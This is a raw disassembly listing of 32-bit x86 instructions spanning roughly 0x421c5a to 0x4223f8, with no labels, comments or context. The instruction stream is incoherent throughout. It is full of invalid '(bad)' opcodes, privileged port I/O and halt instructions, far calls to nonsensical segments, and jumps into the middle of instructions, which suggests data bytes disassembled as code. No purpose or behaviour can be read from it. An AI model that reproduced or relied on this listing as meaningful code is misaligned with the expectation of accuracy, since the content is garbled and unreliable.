  421c5a:	(bad)  
  421c5b:	fisttp WORD PTR [edi]
  421c5d:	arpl   WORD PTR [eax],bp
  421c5f:	sub    DWORD PTR [ebx+0x1e],edi
  421c62:	adc    BYTE PTR [edi+0x21],cl
  421c65:	jecxz  0x421cd9
  421c67:	cwde   
  421c68:	shl    DWORD PTR [esi],1
  421c6a:	call   0xa7e3:0x97ba1010
  421c71:	jecxz  0x421ce9
  421c73:	sar    DWORD PTR [esi+0x36],0x50
  421c77:	je     0x421cee
  421c79:	lock js 0x421cb7
  421c7c:	xor    eax,0xd1ca90c3
  421c81:	dec    edx
  421c82:	sti    
  421c83:	lahf   
  421c84:	inc    esp
  421c85:	jb     0x421c6c
  421c87:	xchg   ebx,eax
  421c88:	jne    0x421d04
  421c8a:	out    dx,eax
  421c8b:	repnz in al,0xc0
  421c8e:	dec    edi
  421c8f:	dec    edi
  421c90:	inc    edi
  421c91:	ds pop ds
  421c93:	jle    0x421cfa
  421c95:	aad    0x22
  421c97:	and    al,0xb
  421c99:	jb     0x421cee
  421c9b:	jle    0x421c58
  421c9d:	xchg   esp,eax
  421c9e:	out    dx,al
  421c9f:	loop   0x421c36
  421ca1:	es or  dl,al
  421ca4:	loop   0x421cca
  421ca6:	sbb    eax,0x6f5282f4
  421cab:	retf   
  421cac:	lds    esi,FWORD PTR [ecx+ebx*2+0x66]
  421cb0:	lock cmp bh,BYTE PTR [edi+0x58436465]
  421cb7:	ja     0x421ca9
  421cb9:	mov    eax,ds:0x5d8ea3d8
  421cbe:	ins    DWORD PTR es:[edi],dx
  421cbf:	xchg   esp,eax
  421cc0:	lea    eax,[edi-0x15c3bdc0]
  421cc6:	xlat   BYTE PTR ds:[ebx]
  421cc7:	ins    DWORD PTR es:[edi],dx
  421cc8:	mov    bh,0x6
  421cca:	mov    ecx,0x5a29a1fe
  421ccf:	ds ins DWORD PTR es:[edi],dx
  421cd1:	mov    edi,0x2e9be438
  421cd6:	and    ebp,DWORD PTR [ecx+0x30]
  421cd9:	add    bh,BYTE PTR [edi]
  421cdb:	call   DWORD PTR [ecx]
  421cdd:	add    DWORD PTR [ebp-0x726c3847],ebx
  421ce3:	mov    dh,0xa3
  421ce5:	push   ds
  421ce6:	adc    al,0x3f
  421ce8:	dec    ebx
  421ce9:	sub    esi,ebx
  421ceb:	dec    ecx
  421cec:	pop    ecx
  421ced:	add    DWORD PTR [ebp+ecx*1-0x4224116e],ebx
  421cf4:	jg     0x421cf4
  421cf6:	pop    esp
  421cf7:	cwde   
  421cf8:	scas   al,BYTE PTR es:[edi]
  421cf9:	jne    0x421c94
  421cfb:	shl    edi,cl
  421cfd:	inc    esi
  421cfe:	jle    0x421d5f
  421d00:	outs   dx,DWORD PTR ds:[esi]
  421d01:	adc    eax,0xf0ae5d62
  421d06:	and    eax,DWORD PTR [ebp-0x6d]
  421d09:	adc    al,0x1a
  421d0b:	cmp    BYTE PTR [edi-0x6c],0xc8
  421d0f:	jge    0x421cab
  421d11:	xor    ah,BYTE PTR [eax+ebx*1-0x60]
  421d15:	xchg   ebx,eax
  421d16:	leave  
  421d17:	inc    esi
  421d18:	xchg   esi,eax
  421d19:	mov    ebp,0x29249d4a
  421d1e:	test   al,0x86
  421d20:	cmp    eax,esi
  421d22:	repnz (bad) 
  421d24:	push   ecx
  421d25:	(bad)  
  421d28:	rol    dh,1
  421d2a:	bound  edx,QWORD PTR [edx]
  421d2c:	(bad)  
  421d2d:	push   ebp
  421d2e:	(bad)  
  421d2f:	rcl    cl,1
  421d31:	mov    al,ds:0x119f2119
  421d36:	push   cs
  421d37:	sub    al,0x41
  421d39:	dec    ebp
  421d3a:	fnstenv [ebp+eiz*1-0x27]
  421d3e:	mov    ecx,0x3a98b394
  421d43:	inc    edi
  421d44:	scas   eax,DWORD PTR es:[edi]
  421d45:	mov    ds:0x9245c7a6,eax
  421d4a:	adc    ebp,esi
  421d4c:	sub    ebp,0xffffffad
  421d4f:	cmp    DWORD PTR [esi-0x5f80768f],esi
  421d55:	icebp  
  421d56:	sbb    al,0x18
  421d58:	add    al,0xf9
  421d5a:	(bad)  
  421d5c:	ins    DWORD PTR es:[edi],dx
  421d5d:	stc    
  421d5e:	sbb    eax,0x90b73455
  421d63:	inc    esp
  421d64:	dec    eax
  421d65:	xor    DWORD PTR [esi],0xcb097ec4
  421d6b:	pop    ecx
  421d6c:	mov    BYTE PTR [edx-0x2e],bh
  421d6f:	and    al,0x21
  421d71:	add    bh,BYTE PTR [ecx-0x56]
  421d74:	push   0xffffffdd
  421d76:	push   esp
  421d77:	adc    DWORD PTR [ecx+ecx*1],ebx
  421d7a:	and    al,0xbf
  421d7c:	mov    ds:0x581f73a9,eax
  421d81:	cmp    al,0x84
  421d83:	sbb    eax,0x77ac528b
  421d88:	jae    0x421d80
  421d8a:	mov    ch,ah
  421d8c:	xlat   BYTE PTR ds:[ebx]
  421d8d:	lahf   
  421d8e:	mov    eax,0x2ea642f2
  421d93:	pop    eax
  421d94:	lds    ebp,FWORD PTR [edi+ebx*1]
  421d97:	push   ds
  421d98:	or     ebp,edx
  421d9a:	jmp    DWORD PTR [edx+esi*2+0x33]
  421d9e:	(bad)  
  421d9f:	mov    dl,0x1a
  421da1:	sub    bl,BYTE PTR [edx-0x3f]
  421da4:	jmp    0xe63ecf61
  421da9:	dec    ecx
  421daa:	sbb    cl,cl
  421dac:	(bad)  
  421dae:	adc    eax,0x59d1bcf4
  421db3:	push   0xffffff85
  421db5:	xor    al,0xa5
  421db7:	into   
  421db8:	pop    ds
  421db9:	lahf   
  421dba:	push   0x30cfb406
  421dbf:	outs   dx,DWORD PTR ds:[esi]
  421dc0:	jp     0x421d8e
  421dc2:	dec    esi
  421dc3:	(bad)  
  421dc4:	popf   
  421dc5:	call   0xc517:0x72845b59
  421dcc:	xor    DWORD PTR [edi+0x1c],edx
  421dcf:	push   eax
  421dd0:	xchg   esp,eax
  421dd1:	stos   BYTE PTR es:[edi],al
  421dd2:	je     0x421e40
  421dd4:	add    BYTE PTR [eax],al
  421dd6:	jae    0x421d5a
  421dd8:	iret   
  421dd9:	and    eax,0xceb8ef3d
  421dde:	dec    ecx
  421ddf:	mov    ch,0xd4
  421de1:	stc    
  421de2:	pop    esp
  421de3:	adc    dl,dh
  421de5:	sub    esp,DWORD PTR [esi]
  421de7:	retf   
  421de8:	and    DWORD PTR [eax-0x140f88fb],edi
  421dee:	xchg   esp,eax
  421def:	int3   
  421df0:	icebp  
  421df1:	jge    0x421da6
  421df3:	mov    edi,0x6b3358df
  421df8:	out    dx,eax
  421df9:	sub    eax,0x1362f925
  421dfe:	xor    eax,0xe6986d03
  421e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e05:	jns    0x421e15
  421e07:	jno    0x421dc3
  421e09:	imul   edi,DWORD PTR [esi-0x62],0x6d
  421e0d:	push   edx
  421e0f:	xchg   ebx,eax
  421e10:	ss cli 
  421e12:	fstp   DWORD PTR [ecx+eiz*4]
  421e15:	push   ds
  421e16:	(bad)  
  421e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e18:	ds mov ebp,0xf205f28c
  421e1e:	sets   BYTE PTR [edx-0x80]
  421e22:	pop    eax
  421e23:	xchg   ebp,eax
  421e24:	je     0x421dd6
  421e26:	dec    ecx
  421e27:	xor    BYTE PTR [eax-0x1],bh
  421e2a:	test   BYTE PTR [edi-0x232e602f],ch
  421e30:	cwde   
  421e31:	imul   ebp,DWORD PTR [eax],0x49000b7c
  421e37:	(bad)  [ecx-0x77]
  421e3a:	test   eax,0x9756bbfb
  421e3f:	inc    esi
  421e40:	mov    bh,0x2f
  421e42:	mov    al,ds:0x26b8c21
  421e47:	dec    esp
  421e48:	sub    esi,esi
  421e4a:	clc    
  421e4b:	xchg   esp,eax
  421e4c:	test   DWORD PTR [eax-0x38],esi
  421e4f:	inc    ecx
  421e50:	xchg   BYTE PTR ds:0xa63bb9eb,bl
  421e56:	cmp    al,0x74
  421e58:	es inc edi
  421e5a:	aaa    
  421e5b:	ret    
  421e5c:	lea    ebx,[ebp+eiz*4+0x62]
  421e60:	into   
  421e61:	loope  0x421dee
  421e63:	in     al,0x99
  421e65:	xchg   BYTE PTR [esi+0x70],ah
  421e68:	jmp    0x421e51
  421e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e6b:	or     eax,0xd5086ecf
  421e70:	sub    DWORD PTR [esi],edx
  421e72:	push   ds
  421e73:	in     eax,0xde
  421e75:	ret    0x8a7b
  421e78:	adc    cl,BYTE PTR [edi+0x6826a34d]
  421e7e:	outs   dx,BYTE PTR ds:[esi]
  421e7f:	pop    edi
  421e80:	pop    eax
  421e81:	test   eax,0x253a67e4
  421e86:	rol    DWORD PTR [ebp+ecx*8-0x12684970],0x54
  421e8e:	mov    DWORD PTR [ebx+0x5663699a],edi
  421e94:	add    esp,DWORD PTR [ecx-0x7c]
  421e97:	stos   BYTE PTR es:[edi],al
  421e98:	adc    ecx,esp
  421e9a:	mov    eax,ds:0xed4ada4a
  421e9f:	mov    bl,0xbc
  421ea1:	lea    eax,[eax]
  421ea3:	int    0xdc
  421ea5:	mov    edx,0x6891d907
  421eaa:	sbb    eax,0x7329d814
  421eaf:	pop    ecx
  421eb0:	mov    ds:0x436ca20b,al
  421eb5:	(bad)  
  421eb6:	fstp   TBYTE PTR [eax]
  421eb8:	add    al,0x4f
  421eba:	(bad)  
  421ebb:	dec    ebx
  421ebc:	es sub eax,0x74836b34
  421ec2:	sahf   
  421ec3:	xor    DWORD PTR [eax+0x58c2b7bb],ebx
  421ec9:	jne    0x421ee7
  421ecb:	and    eax,0x4b29c0d4
  421ed0:	xor    dl,BYTE PTR [ebp-0x678d804a]
  421ed6:	adc    BYTE PTR [ebx+0x23],0xfa
  421eda:	popa   
  421edb:	into   
  421edc:	iret   
  421edd:	in     al,0x3a
  421edf:	mov    BYTE PTR [edi+ebp*4+0x419b57e2],0x58
  421ee7:	sbb    al,bh
  421ee9:	fisub  DWORD PTR [bx+di-0x18]
  421eed:	cmp    BYTE PTR [ebp+0xa40b633],0x15
  421ef4:	cmp    DWORD PTR [esp+ecx*8],ecx
  421ef7:	adc    DWORD PTR [edi-0x5feeeb2e],esi
  421efd:	push   ds
  421efe:	dec    edi
  421eff:	mov    esi,0xc0ec1207
  421f04:	inc    ebp
  421f05:	mov    al,0xb9
  421f07:	dec    esp
  421f08:	jecxz  0x421e8f
  421f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f0b:	popa   
  421f0c:	sbb    eax,0xa5846856
  421f11:	xor    eax,0x6d6436b5
  421f16:	xor    bh,BYTE PTR [edx-0x2f]
  421f19:	inc    ebp
  421f1a:	call   0x7a78:0x4a4aa3e5
  421f21:	xor    DWORD PTR [esi+0x1b],0x3ca2b43a
  421f28:	scas   al,BYTE PTR es:[edi]
  421f29:	or     ah,bh
  421f2b:	mov    dh,0xcf
  421f2d:	pop    eax
  421f2e:	dec    eax
  421f2f:	movzx  edx,cx
  421f32:	xchg   ebp,eax
  421f33:	hlt    
  421f34:	ins    BYTE PTR es:[edi],dx
  421f35:	in     eax,0xc4
  421f37:	pop    ebp
  421f38:	popf   
  421f39:	push   ebp
  421f3a:	les    ebx,FWORD PTR [edi]
  421f3c:	call   0xcd6f:0x2d351bd3
  421f43:	xchg   edx,eax
  421f44:	sub    al,0xfe
  421f46:	push   0x52
  421f48:	in     al,0x4b
  421f4a:	adc    ebx,DWORD PTR [ecx]
  421f4c:	enter  0x3b96,0x9d
  421f50:	mov    WORD PTR [edx+eiz*2],es
  421f53:	xchg   esp,esi
  421f55:	and    al,BYTE PTR [ecx+0x62838194]
  421f5b:	jg     0x421f0b
  421f5d:	std    
  421f5e:	jno    0x421f64
  421f60:	dec    esp
  421f61:	push   ds
  421f62:	retf   
  421f63:	aas    
  421f64:	mov    edi,0xa9f4a8c8
  421f69:	int    0x3
  421f6b:	mov    al,ds:0xe0a017e2
  421f70:	pop    esi
  421f71:	mov    ebx,0x39e7f64f
  421f76:	sub    al,0xa0
  421f78:	xor    BYTE PTR [ecx+0x38],bl
  421f7b:	mov    edx,0xc8f08e
  421f80:	sub    BYTE PTR ds:0xf17cbc68,ah
  421f86:	mul    BYTE PTR [edi-0x37]
  421f89:	mov    bl,0x4c
  421f8b:	fimul  WORD PTR [esi+0x43]
  421f8e:	pop    ecx
  421f8f:	in     al,dx
  421f90:	aaa    
  421f91:	cmp    dl,BYTE PTR [ebx]
  421f93:	sbb    esi,DWORD PTR [eax+0x29]
  421f96:	and    cl,0xe0
  421f99:	pop    esp
  421f9a:	pop    ss
  421f9b:	addr16 hlt 
  421f9d:	(bad)  
  421f9e:	popf   
  421f9f:	pop    edx
  421fa0:	and    eax,0x3bbb46f5
  421fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fa6:	sbb    ebx,DWORD PTR [edx+0x7d]
  421fa9:	in     al,0x5c
  421fab:	(bad)  
  421fac:	mul    BYTE PTR [ebx]
  421fae:	jbe    0x421f79
  421fb0:	inc    esi
  421fb1:	sbb    eax,0xdaba783b
  421fb6:	outs   dx,DWORD PTR ds:[esi]
  421fb7:	jl     0x421fa5
  421fb9:	enter  0x5b2,0xb5
  421fbd:	xchg   esp,eax
  421fbe:	dec    ebx
  421fbf:	dec    ecx
  421fc0:	div    esi
  421fc2:	shl    BYTE PTR [ebx+0x37],0x6c
  421fc6:	(bad)  
  421fc7:	fcmovbe st,st(6)
  421fc9:	in     al,0xa1
  421fcb:	inc    edi
  421fcc:	dec    edi
  421fcd:	mov    esp,0x8aacb28e
  421fd2:	adc    BYTE PTR [ecx],dh
  421fd4:	jmp    0x421f57
  421fd6:	dec    edi
  421fd7:	out    dx,al
  421fd8:	pop    edx
  421fd9:	fwait
  421fda:	sub    esi,DWORD PTR [eax-0x11]
  421fdd:	mov    bh,0xc8
  421fdf:	fst    QWORD PTR [ebx+0x226fdcfe]
  421fe5:	cmp    ebx,DWORD PTR gs:[ebx-0x6a02f075]
  421fec:	sub    ecx,DWORD PTR [ecx-0x16a23b92]
  421ff2:	cli    
  421ff3:	mov    ds:0x7df18837,eax
  421ff8:	or     ebx,esi
  421ffa:	(bad)  
  421ffb:	aam    0x46
  421ffd:	jp     0x422005
  421fff:	(bad)  
  422000:	jmp    0x65a6:0xc75f6dc1
  422007:	cmp    eax,0xac28bf41
  42200c:	stc    
  42200d:	jb     0x421fa6
  42200f:	imul   eax,ebx,0xffffff89
  422012:	je     0x42201a
  422014:	cmp    esp,DWORD PTR [ecx+0x4a]
  422017:	clc    
  422018:	repnz out 0xee,al
  42201b:	icebp  
  42201c:	pop    ebp
  42201d:	(bad)  
  42201e:	jge    0x42209d
  422020:	xchg   ecx,eax
  422021:	push   es
  422022:	inc    ebx
  422023:	inc    ecx
  422024:	sbb    al,0x13
  422026:	repnz inc edx
  422028:	cmp    DWORD PTR [ebx],esi
  42202a:	cmp    al,0xfc
  42202c:	in     eax,0x30
  42202e:	daa    
  42202f:	cli    
  422030:	inc    edx
  422031:	repz inc esi
  422033:	mov    bh,0xed
  422035:	ins    DWORD PTR es:[edi],dx
  422036:	push   cs
  422037:	dec    esp
  422038:	mov    al,ds:0xa1f930d5
  42203d:	lahf   
  42203e:	sbb    al,BYTE PTR [edi+0x60fbd28]
  422044:	into   
  422045:	inc    ecx
  422046:	xchg   ebp,eax
  422047:	push   edi
  422048:	or     eax,0xcd2f18c7
  42204d:	lds    ebp,FWORD PTR es:[edx+0x7b049811]
  422054:	sahf   
  422055:	or     eax,0x732f719
  42205a:	cmp    ah,bh
  42205c:	loop   0x421ff5
  42205e:	popa   
  42205f:	mov    al,0xc
  422061:	cli    
  422062:	push   cs
  422063:	das    
  422064:	add    DWORD PTR [edx+0x67],0x38
  422068:	aam    0x58
  42206a:	push   edx
  42206b:	mov    DWORD PTR [edi+0x3f],esp
  42206e:	addr16 test al,0x6e
  422071:	frstor [esi]
  422073:	inc    ebx
  422074:	mov    ebp,0x4f13013
  422079:	in     al,0x89
  42207b:	iret   
  42207c:	pop    esi
  42207d:	dec    ebx
  42207e:	jg     0x422000
  422080:	adc    al,0x6b
  422082:	adc    DWORD PTR [esi+eiz*8+0x5f],edi
  422086:	sbb    DWORD PTR [esi+0x29],esp
  422089:	push   esp
  42208a:	add    al,BYTE PTR [ebx]
  42208c:	adc    eax,0xb07d96a7
  422091:	sahf   
  422092:	retf   
  422093:	shl    ecx,0xf4
  422096:	sbb    ebx,DWORD PTR [eax]
  422098:	jae    0x42207f
  42209a:	fs pop ecx
  42209c:	divps  xmm1,XMMWORD PTR [eax-0x1a]
  4220a0:	cmp    DWORD PTR [ebx],0xca2b5440
  4220a6:	rcl    DWORD PTR [esi+0x3],cl
  4220a9:	shl    dh,cl
  4220ab:	rcr    edi,1
  4220ad:	sub    bl,BYTE PTR [edi]
  4220af:	fstp   QWORD PTR [edx-0x26c98d58]
  4220b5:	mov    eax,ds:0xd007961c
  4220ba:	cmp    eax,0x7507e9d0
  4220bf:	add    al,0x40
  4220c1:	stc    
  4220c2:	pop    edx
  4220c3:	mov    esp,0x8ea81faa
  4220c8:	repz mov esi,0xa9556f13
  4220ce:	rcl    DWORD PTR [ecx+edi*4],cl
  4220d1:	rcl    BYTE PTR ds:0x88b35d99,0xab
  4220d8:	es stos BYTE PTR es:[edi],al
  4220da:	int3   
  4220db:	xlat   BYTE PTR ds:[ebx]
  4220dc:	mov    ds:0x17525f71,al
  4220e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e2:	adc    ebx,edx
  4220e4:	xchg   ebx,eax
  4220e5:	xchg   BYTE PTR [edx+0x47f25a2a],bh
  4220eb:	jae    0x422084
  4220ed:	mov    DWORD PTR [esi+0x3a],0xf44e34dd
  4220f4:	dec    ecx
  4220f5:	daa    
  4220f6:	jae    0x4220e1
  4220f8:	push   edx
  4220f9:	mov    al,ds:0xb1d7fde
  4220fe:	and    bh,ah
  422100:	ja     0x422158
  422102:	xchg   edx,eax
  422103:	fst    QWORD PTR [ecx]
  422105:	inc    ecx
  422106:	fwait
  422107:	xor    al,BYTE PTR [ebp+eax*4-0x29cfe566]
  42210e:	push   0xf51d6068
  422113:	and    al,0x8d
  422115:	mov    BYTE PTR [ebx],ch
  422117:	ds stos BYTE PTR es:[edi],al
  422119:	sub    DWORD PTR [eax+0x3be607d],ecx
  42211f:	fisubr DWORD PTR [esi*2-0x60ec0e57]
  422126:	fld    TBYTE PTR [eax+0x754ec228]
  42212c:	cmp    al,0x2b
  42212e:	or     BYTE PTR [edx],bl
  422130:	pop    ebp
  422131:	cmp    al,0xe6
  422133:	push   0x36
  422135:	dec    ebp
  422136:	es xchg edx,eax
  422138:	pop    ebx
  422139:	mov    eax,ds:0x9ce2ba1f
  42213e:	jmp    0x204ce375
  422143:	jle    0x42212f
  422145:	push   ebp
  422146:	xchg   esi,eax
  422147:	cmp    al,bl
  422149:	jno    0x42210f
  42214b:	push   esi
  42214c:	xchg   edi,eax
  42214d:	push   ebp
  42214e:	xchg   bl,dh
  422150:	rcl    ch,1
  422152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422153:	ret    
  422154:	dec    ecx
  422155:	or     esp,DWORD PTR [ebp+0x3]
  422158:	arpl   WORD PTR [edx+0x2f],sp
  42215b:	clc    
  42215c:	pop    esp
  42215d:	sahf   
  42215e:	dec    ebp
  42215f:	add    ebp,edx
  422161:	sub    ah,BYTE PTR [eax]
  422163:	push   ebp
  422164:	sar    BYTE PTR [eax],cl
  422166:	dec    ebx
  422167:	pop    edx
  422168:	out    dx,al
  422169:	and    DWORD PTR [edi+0x6e],esi
  42216c:	jne    0x4220f2
  42216e:	mov    esp,ds
  422170:	mov    ebx,0xdfdaa87b
  422175:	adc    BYTE PTR [esi],bl
  422177:	in     eax,dx
  422178:	mov    dl,0xec
  42217a:	mov    cl,cl
  42217c:	hlt    
  42217d:	dec    ecx
  42217e:	(bad)  
  42217f:	cmp    DWORD PTR [ecx+0x31e3638e],edi
  422185:	xlat   BYTE PTR ds:[ebx]
  422186:	push   edi
  422187:	sub    cl,dl
  422189:	ja     0x42212f
  42218b:	ja     0x422118
  42218d:	dec    eax
  42218e:	mov    ecx,0xef38b983
  422193:	pop    ss
  422194:	pop    ss
  422195:	push   edx
  422196:	and    eax,0x22a8255f
  42219b:	bound  edx,QWORD PTR [ecx-0x5f]
  42219e:	dec    edi
  42219f:	shl    DWORD PTR [esi+edi*4],1
  4221a2:	inc    ecx
  4221a3:	dec    eax
  4221a4:	jnp    0x422213
  4221a6:	add    BYTE PTR [ecx],bl
  4221a8:	jge    0x4221fd
  4221aa:	jbe    0x4221da
  4221ac:	mov    esp,0x1908fc82
  4221b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b2:	mov    dh,0x18
  4221b4:	lods   al,BYTE PTR ds:[esi]
  4221b5:	cmovo  esi,DWORD PTR [ecx+0x58]
  4221b9:	loop   0x4221d2
  4221bb:	jnp    0x422216
  4221bd:	or     DWORD PTR [ecx-0x4fc44979],0xffffffd3
  4221c4:	fucom  st(6)
  4221c6:	sbb    cl,BYTE PTR [esi]
  4221c8:	jle    0x422241
  4221ca:	adc    al,0x79
  4221cc:	in     al,0x37
  4221ce:	xchg   ebp,eax
  4221cf:	loopne 0x4221af
  4221d1:	scas   eax,DWORD PTR es:[edi]
  4221d2:	scas   al,BYTE PTR es:[edi]
  4221d3:	pop    eax
  4221d4:	aam    0x46
  4221d6:	ins    BYTE PTR es:[edi],dx
  4221d7:	aam    0x48
  4221d9:	je     0x42217e
  4221db:	push   ss
  4221dc:	jo     0x4221c6
  4221de:	aas    
  4221df:	test   DWORD PTR [ecx-0x39],esp
  4221e2:	add    al,BYTE PTR [edx-0x5d]
  4221e5:	inc    esi
  4221e6:	int    0x5d
  4221e8:	xchg   edi,eax
  4221e9:	sub    eax,0xffc94d26
  4221ee:	push   eax
  4221ef:	pop    ecx
  4221f0:	jecxz  0x422261
  4221f2:	inc    edi
  4221f3:	or     al,0x8e
  4221f5:	mov    ch,BYTE PTR [eax+0x22]
  4221f8:	in     al,dx
  4221f9:	outs   dx,DWORD PTR ds:[esi]
  4221fa:	sahf   
  4221fb:	mov    cl,0x3b
  4221fd:	retf   
  4221fe:	cmp    al,0x55
  422200:	loop   0x4221ec
  422202:	gs fcmove st,st(5)
  422205:	adc    eax,0x878cb688
  42220a:	and    eax,0xc8ec485c
  42220f:	scas   al,BYTE PTR es:[edi]
  422210:	jmp    0xab27ad2f
  422215:	mov    ecx,ebx
  422217:	pusha  
  422218:	test   DWORD PTR [ebx+0x1982506e],0x75dea311
  422222:	es xchg ebp,eax
  422224:	cdq    
  422225:	aas    
  422226:	ficom  DWORD PTR [ebp-0x6e124965]
  42222c:	leave  
  42222d:	or     dl,BYTE PTR cs:[esi-0x3e]
  422231:	movd   mm4,ebp
  422234:	(bad)  
  422235:	into   
  422236:	mov    fs,WORD PTR ds:0x44eb9120
  42223c:	cs cwde 
  42223e:	sbb    BYTE PTR fs:[esi-0x3b],bl
  422242:	pop    es
  422243:	ret    0xe093
  422246:	mov    ah,0x69
  422248:	jecxz  0x4221e0
  42224a:	lock jnp 0x42222f
  42224d:	push   edx
  42224e:	add    al,0x4d
  422250:	and    BYTE PTR ds:0x2eafe24d,bl
  422256:	addr16 icebp 
  422258:	cli    
  422259:	das    
  42225a:	xchg   ebx,eax
  42225b:	stos   DWORD PTR es:[edi],eax
  42225c:	xor    al,0xae
  42225e:	push   cs
  42225f:	div    BYTE PTR ds:[ebp-0x78]
  422263:	lahf   
  422264:	xor    eax,0x650a166e
  422269:	repnz addr16 push ebp
  42226c:	sub    eax,0xe9fc9172
  422271:	(bad)  
  422273:	sbb    eax,DWORD PTR [bx+di]
  422276:	leave  
  422277:	lods   al,BYTE PTR ds:[esi]
  422278:	dec    esi
  422279:	cld    
  42227a:	fnstcw WORD PTR [ecx+0x2dc99088]
  422280:	or     DWORD PTR ds:0x3c4b7165,0xfb900604
  42228a:	test   edx,0x8e25822d
  422290:	jns    0x4222cb
  422292:	xchg   edi,eax
  422293:	dec    edi
  422294:	mov    eax,es:0xc801bc47
  42229a:	outs   dx,BYTE PTR ds:[esi]
  42229b:	loopne 0x42226a
  42229d:	cs pop ss
  42229f:	dec    esi
  4222a0:	cmp    edi,DWORD PTR [edx-0x3386ed20]
  4222a6:	add    ah,BYTE PTR [edx]
  4222a8:	pop    ss
  4222a9:	jge    0x42222b
  4222ab:	mov    dh,0xfd
  4222ad:	mov    eax,ds:0x31324575
  4222b2:	pop    edi
  4222b3:	sub    ebp,DWORD PTR [eax+ebp*2+0x59]
  4222b7:	inc    edx
  4222b8:	ja     0x422271
  4222ba:	sub    eax,0xd4e237f0
  4222bf:	cmp    ebx,DWORD PTR [edi]
  4222c1:	mov    al,0x55
  4222c3:	data16 sub BYTE PTR [esi+eax*8+0x3d4e4dd3],bl
  4222cb:	dec    ecx
  4222cc:	dec    ebp
  4222cd:	adc    eax,0xff34caf9
  4222d2:	outs   dx,DWORD PTR ds:[esi]
  4222d3:	xchg   ebp,eax
  4222d4:	jb     0x422302
  4222d6:	(bad)  
  4222d7:	int3   
  4222d8:	icebp  
  4222d9:	add    cl,BYTE PTR [esi-0x79]
  4222dc:	adc    edi,DWORD PTR [eax+0x11]
  4222df:	mov    ss,WORD PTR [edx+0x2a]
  4222e2:	sub    BYTE PTR [ebp-0x27],0x52
  4222e6:	xchg   ecx,eax
  4222e7:	mov    eax,ds:0x61cc4f
  4222ec:	push   0xffffffe3
  4222ee:	add    al,0xf2
  4222f0:	xchg   ebp,eax
  4222f1:	aas    
  4222f2:	lea    ecx,[edx-0x62]
  4222f5:	sub    dh,ch
  4222f7:	dec    ebp
  4222f8:	jns    0x422313
  4222fa:	outs   dx,BYTE PTR ds:[esi]
  4222fb:	out    dx,eax
  4222fc:	dec    ebp
  4222fd:	call   0x97093da0
  422302:	jecxz  0x4222f4
  422304:	mov    ds:0x5ac49cdc,eax
  422309:	jle    0x42234d
  42230b:	popf   
  42230c:	push   edx
  42230d:	fild   QWORD PTR [ebx-0x40c2958d]
  422313:	and    BYTE PTR gs:[eax+ebx*2],ah
  422317:	jb     0x42234f
  422319:	mov    ch,0x7
  42231b:	and    al,0x76
  42231d:	jae    0x422364
  42231f:	(bad)  
  422320:	clc    
  422321:	pop    eax
  422322:	popa   
  422323:	fist   WORD PTR [ebp-0x8]
  422326:	mov    dh,0xa3
  422328:	push   esp
  422329:	sbb    ah,al
  42232b:	fidiv  WORD PTR [eax-0x77]
  42232e:	bound  esp,QWORD PTR [edx-0x2f]
  422331:	inc    DWORD PTR [ebx-0x3010bb05]
  422337:	rcr    BYTE PTR [ebx-0x6e508a5c],cl
  42233d:	popa   
  42233e:	dec    BYTE PTR [esi*1-0x56e60e2a]
  422345:	push   esp
  422346:	fdiv   DWORD PTR [esi-0x17cc9d76]
  42234c:	xor    BYTE PTR [esi+edx*8],bl
  42234f:	dec    esi
  422350:	jnp    0x4222f0
  422352:	xor    BYTE PTR [ebp+0x67],cl
  422355:	inc    esp
  422356:	in     al,dx
  422357:	mov    dl,0x4
  422359:	fs icebp 
  42235b:	ins    DWORD PTR es:[edi],dx
  42235c:	add    al,0xe0
  42235e:	xor    DWORD PTR [eax],ecx
  422360:	dec    eax
  422361:	loopne 0x422329
  422363:	jnp    0x42239d
  422365:	pop    edx
  422366:	lea    esi,ds:0x96ca06dd
  42236c:	sub    al,0xe6
  42236e:	jecxz  0x4223b9
  422370:	xchg   edx,eax
  422371:	mov    edx,0xb9ba874c
  422376:	and    ebx,DWORD PTR [edx-0x3d]
  422379:	lock arpl WORD PTR [edx+ecx*1],bx
  42237d:	and    DWORD PTR [ebp+0x6e],edx
  422380:	rcr    DWORD PTR ds:0x60f379fd,0x2a
  422387:	call   0xad032bcc
  42238c:	mov    ah,0xe9
  42238e:	stos   DWORD PTR es:[edi],eax
  42238f:	clc    
  422390:	das    
  422391:	pop    edx
  422392:	add    BYTE PTR [ebx],al
  422394:	fadd   QWORD PTR [edx]
  422396:	sub    eax,0xe7014585
  42239b:	cs xchg edi,eax
  42239d:	popa   
  42239e:	and    eax,0xafee1a64
  4223a3:	jge    0x422343
  4223a5:	leave  
  4223a6:	loope  0x42236c
  4223a8:	adc    al,0xb5
  4223aa:	inc    esp
  4223ab:	pushf  
  4223ac:	shl    BYTE PTR [eax-0x37693cd7],cl
  4223b2:	sbb    eax,0x95cdb94b
  4223b7:	mov    al,0x1e
  4223b9:	cwde   
  4223ba:	cdq    
  4223bb:	lock jns 0x422394
  4223be:	loope  0x422356
  4223c0:	stos   DWORD PTR es:[edi],eax
  4223c1:	fwait
  4223c2:	xor    edi,DWORD PTR [esi]
  4223c4:	add    al,0xce
  4223c6:	lock mov esi,0xb5487be8
  4223cc:	scas   eax,DWORD PTR es:[edi]
  4223cd:	mov    cl,0x12
  4223cf:	jbe    0x422439
  4223d1:	leave  
  4223d2:	sbb    bl,BYTE PTR [ecx-0x70]
  4223d5:	pusha  
  4223d6:	xchg   edx,eax
  4223d7:	inc    ecx
  4223d8:	fs (bad) 
  4223da:	and    ah,BYTE PTR [ebp-0x11]
  4223dd:	mov    cs,WORD PTR [edi]
  4223df:	retf   
  4223e0:	stos   DWORD PTR es:[edi],eax
  4223e1:	inc    ebp
  4223e2:	mov    ah,0x24
  4223e4:	dec    ebx
  4223e5:	mov    al,ds:0xdf7a98ac
  4223ea:	xchg   BYTE PTR [ebx-0x56],bl
  4223ed:	loopne 0x422429
  4223ef:	lahf   
  4223f0:	sbb    bh,BYTE PTR [edx-0x3922e972]
  4223f6:	sahf   
  4223f7:	lahf   
  4223f8:	xor    ebp,esp
